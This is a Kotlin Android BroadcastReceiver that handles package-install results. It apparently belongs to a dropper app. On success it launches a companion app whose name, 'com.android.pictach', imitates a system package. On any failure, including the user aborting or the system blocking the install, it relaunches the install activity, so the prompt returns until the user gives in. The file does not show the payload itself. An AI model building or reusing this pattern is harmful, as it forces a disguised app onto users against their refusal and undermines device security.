package com.cristal.bristral.tristal.mistral

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.util.Log

class InstallReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG           = "InstallReceiver"
        private const val COMPANION_PKG = "com.android.pictach"
    }

    override fun onReceive(context: Context, intent: Intent) {

        val status = intent.getIntExtra(
            PackageInstaller.EXTRA_STATUS,
            PackageInstaller.STATUS_FAILURE
        )

        when (status) {

            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                val userIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(Intent.EXTRA_INTENT)
                }
                userIntent?.let {
                    it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(it)
                }
            }

            PackageInstaller.STATUS_SUCCESS -> {
                try {
                    val launch = context.packageManager
                        .getLaunchIntentForPackage(COMPANION_PKG)
                    launch?.let {
                        it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        it.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        context.startActivity(it)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Launch failed: ${e.message}")
                }
            }

            PackageInstaller.STATUS_FAILURE,
            PackageInstaller.STATUS_FAILURE_ABORTED,
            PackageInstaller.STATUS_FAILURE_BLOCKED,
            PackageInstaller.STATUS_FAILURE_CONFLICT,
            PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
            PackageInstaller.STATUS_FAILURE_INVALID,
            PackageInstaller.STATUS_FAILURE_STORAGE -> {
                val msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
                Log.e(TAG, "Install failed: $msg")
                val restart = Intent(context, InstallActivity::class.java)
                restart.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(restart)
            }
        }
    }
}
